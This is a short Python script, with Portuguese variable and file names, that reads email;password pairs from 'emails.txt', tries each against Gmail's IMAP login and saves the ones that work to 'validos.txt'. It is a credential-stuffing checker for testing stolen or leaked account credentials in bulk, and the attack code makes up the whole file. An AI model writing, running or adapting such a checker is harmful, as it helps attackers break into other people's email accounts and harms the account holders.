import time

def gmail_checker(username,password):
        import imaplib
        i=imaplib.IMAP4_SSL('imap.gmail.com')
        try:
                i.login(username,password)
                return True
        except:
                return False

class main :

        f = open('emails.txt', 'rb+')
        
        conteudo = f.read().split('\n')

        for i in range(0,len(conteudo)) :
                splitinho = conteudo[i].split(';')
                #print(splitinho[0] + ' ' +splitinho[1])
                #print('\n')
                if(gmail_checker(splitinho[0],splitinho[1])) :
                        g = open('validos.txt','a+')
                        g.write(splitinho[0] + ';' +splitinho[1]+'\n')
                        g.close()
                #else :
                        #print('invalido')

                #time.sleep(3)
                print(i)
                

                

        
